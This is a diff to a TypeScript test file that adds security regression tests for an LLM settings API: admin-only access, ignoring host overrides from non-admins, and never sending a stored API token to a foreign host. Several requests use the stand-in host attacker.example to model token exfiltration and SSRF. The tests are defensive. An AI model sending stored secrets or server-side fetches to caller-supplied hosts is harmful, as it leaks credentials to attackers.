@@ -237,7 +237,7 @@ describe('LLM Routes', () => {
       // glyph is changed (e.g. to a different character count).
       const REDACTED = llmClient.REDACTED_TOKEN_PLACEHOLDER;
 
-      it('treats the redaction sentinel as nullish and falls back to the stored token', async () => {
+      it('treats the redaction sentinel as nullish and falls back to the stored token (same configured endpoint)', async () => {
         mockGetEffectiveLlmConfig.mockReturnValueOnce({
           ...DEFAULT_LLM_CONFIG,
           apiToken: 'sk-stored-real-token',
@@ -245,10 +245,12 @@ describe('LLM Routes', () => {
         mockLlmFetch.mockResolvedValueOnce(modelsResponse(['gpt-4o-mini']));
         const getAuthHeadersSpy = vi.mocked(llmClient.getAuthHeaders);
 
+        // URL is the same origin as the configured apiUrl (localhost:3000), so
+        // the stored token may be re-used when the sentinel is echoed back.
         const res = await app.inject({
           method: 'POST',
           url: '/api/llm/test-connection',
-          payload: { url: 'http://my-api:3000', token: REDACTED },
+          payload: { url: 'http://localhost:3000', token: REDACTED },
         });
 
         expect(res.statusCode).toBe(200);
@@ -256,7 +258,7 @@ describe('LLM Routes', () => {
         expect(getAuthHeadersSpy).toHaveBeenCalledWith('sk-stored-real-token', 'bearer');
       });
 
-      it('falls back to the stored token when no token is supplied at all', async () => {
+      it('falls back to the stored token when no token is supplied at all (same configured endpoint)', async () => {
         mockGetEffectiveLlmConfig.mockReturnValueOnce({
           ...DEFAULT_LLM_CONFIG,
           apiToken: 'sk-stored-real-token',
@@ -267,11 +269,54 @@ describe('LLM Routes', () => {
         const res = await app.inject({
           method: 'POST',
           url: '/api/llm/test-connection',
-          payload: { url: 'http://my-api:3000' },
+          payload: { url: 'http://localhost:3000' },
         });
 
         expect(res.statusCode).toBe(200);
         expect(getAuthHeadersSpy).toHaveBeenCalledWith('sk-stored-real-token', 'bearer');
+      });
+
+      // SECURITY (audit finding): the stored API token must NEVER be forwarded
+      // to a caller-supplied host that differs from the configured endpoint —
+      // otherwise a request to an attacker URL exfiltrates the provider key.
+      it('does NOT forward the stored token to a different host', async () => {
+        mockGetEffectiveLlmConfig.mockReturnValueOnce({
+          ...DEFAULT_LLM_CONFIG,
+          apiToken: 'sk-stored-real-token',
+        });
+        mockLlmFetch.mockResolvedValueOnce(modelsResponse(['gpt-4o-mini']));
+        const getAuthHeadersSpy = vi.mocked(llmClient.getAuthHeaders);
+
+        const res = await app.inject({
+          method: 'POST',
+          url: '/api/llm/test-connection',
+          payload: { url: 'http://attacker.example:3000' },
+        });
+
+        expect(res.statusCode).toBe(200);
+        // No stored token leaked — only an explicit caller token would be sent.
+        expect(getAuthHeadersSpy).not.toHaveBeenCalledWith('sk-stored-real-token', expect.anything());
+        expect(getAuthHeadersSpy).toHaveBeenCalledWith(undefined, 'bearer');
+      });
+
+      it('uses a caller-supplied token verbatim even for a different host', async () => {
+        mockGetEffectiveLlmConfig.mockReturnValueOnce({
+          ...DEFAULT_LLM_CONFIG,
+          apiToken: 'sk-stored-real-token',
+        });
+        mockLlmFetch.mockResolvedValueOnce(modelsResponse(['gpt-4o-mini']));
+        const getAuthHeadersSpy = vi.mocked(llmClient.getAuthHeaders);
+
+        const res = await app.inject({
+          method: 'POST',
+          url: '/api/llm/test-connection',
+          payload: { url: 'http://attacker.example:3000', token: 'sk-caller-supplied' },
+        });
+
+        expect(res.statusCode).toBe(200);
+        // The user's own token is fine; the *stored* secret is what must not leak.
+        expect(getAuthHeadersSpy).toHaveBeenCalledWith('sk-caller-supplied', 'bearer');
+        expect(getAuthHeadersSpy).not.toHaveBeenCalledWith('sk-stored-real-token', expect.anything());
       });
 
       it('uses an explicit non-sentinel token verbatim', async () => {
@@ -727,5 +772,98 @@ describe('LLM Routes', () => {
       expect(body.sampleInput).toContain('abc123');
       expect(body.sampleLabel).toBe('High CPU anomaly');
     });
+  });
+});
+
+// ─── SECURITY REGRESSION: LLM probe RBAC + SSRF/token hardening ──────────
+// Covers audit findings: (a) /api/llm/test-connection must be admin-only;
+// (b) the /api/llm/models `host` override must be ignored for non-admins so a
+// low-privilege user cannot redirect the server-side fetch; (c) the stored API
+// token must never be attached to a caller-supplied foreign host.
+describe('LLM probe RBAC + SSRF hardening', () => {
+  let app: ReturnType<typeof Fastify>;
+  let role: 'viewer' | 'operator' | 'admin';
+
+  beforeEach(async () => {
+    await cache.clear();
+    await flushTestCache();
+    vi.clearAllMocks();
+    mockGetEffectiveLlmConfig.mockReturnValue({ ...DEFAULT_LLM_CONFIG, apiToken: 'sk-stored' });
+    vi.spyOn(portainerClient, 'getEndpoints').mockResolvedValue([]);
+    vi.spyOn(portainerClient, 'getContainers').mockResolvedValue([]);
+    mockLlmFetch = vi.spyOn(llmClient, 'llmFetch');
+    vi.spyOn(llmClient, 'getAuthHeaders').mockReturnValue({});
+    role = 'admin';
+
+    app = Fastify();
+    app.setValidatorCompiler(validatorCompiler);
+    app.decorate('authenticate', async () => undefined);
+    app.decorate('requireRole', (minRole: 'viewer' | 'operator' | 'admin') => async (request: any, reply: any) => {
+      const rank = { viewer: 0, operator: 1, admin: 2 };
+      const userRole = request.user?.role ?? 'viewer';
+      if (rank[userRole as keyof typeof rank] < rank[minRole]) {
+        reply.code(403).send({ error: 'Insufficient permissions' });
+      }
+    });
+    app.decorateRequest('user', undefined);
+    app.addHook('preHandler', async (request: any) => {
+      request.user = { sub: 'u1', username: 'u', sessionId: 's1', role };
+    });
+    await app.register(llmRoutes);
+    await app.ready();
+  });
+
+  afterEach(async () => {
+    await app.close();
+  });
+
+  it('test-connection: rejects viewer and operator with 403 and never fetches', async () => {
+    for (const r of ['viewer', 'operator'] as const) {
+      role = r;
+      const res = await app.inject({ method: 'POST', url: '/api/llm/test-connection', payload: {} });
+      expect(res.statusCode).toBe(403);
+    }
+    expect(mockLlmFetch).not.toHaveBeenCalled();
+  });
+
+  it('test-connection: allows admin', async () => {
+    role = 'admin';
+    mockLlmFetch.mockResolvedValueOnce(modelsResponse(['m1']));
+    const res = await app.inject({ method: 'POST', url: '/api/llm/test-connection', payload: {} });
+    expect(res.statusCode).toBe(200);
+    expect(res.json().ok).toBe(true);
+  });
+
+  it('models: ignores the host override for a non-admin (fetches the configured endpoint, not the attacker host)', async () => {
+    role = 'viewer';
+    mockLlmFetch.mockResolvedValueOnce(modelsResponse(['m1']));
+    await app.inject({
+      method: 'GET',
+      url: `/api/llm/models?host=${encodeURIComponent('http://attacker.example')}`,
+    });
+    expect(mockLlmFetch.mock.calls[0][0]).toBe('http://localhost:3000/v1/models');
+  });
+
+  it('models: does NOT attach the stored token when an admin probes a foreign host', async () => {
+    role = 'admin';
+    const getAuthHeadersSpy = vi.mocked(llmClient.getAuthHeaders);
+    mockLlmFetch.mockResolvedValueOnce(modelsResponse(['m1']));
+    await app.inject({
+      method: 'GET',
+      url: `/api/llm/models?host=${encodeURIComponent('http://attacker.example')}`,
+    });
+    expect(mockLlmFetch.mock.calls[0][0]).toBe('http://attacker.example/v1/models');
+    expect(getAuthHeadersSpy).not.toHaveBeenCalled();
+  });
+
+  it('models: attaches the stored token when an admin probes the configured host', async () => {
+    role = 'admin';
+    const getAuthHeadersSpy = vi.mocked(llmClient.getAuthHeaders);
+    mockLlmFetch.mockResolvedValueOnce(modelsResponse(['m1']));
+    await app.inject({
+      method: 'GET',
+      url: `/api/llm/models?host=${encodeURIComponent('http://localhost:3000')}`,
+    });
+    expect(getAuthHeadersSpy).toHaveBeenCalledWith('sk-stored', 'bearer');
   });
 });
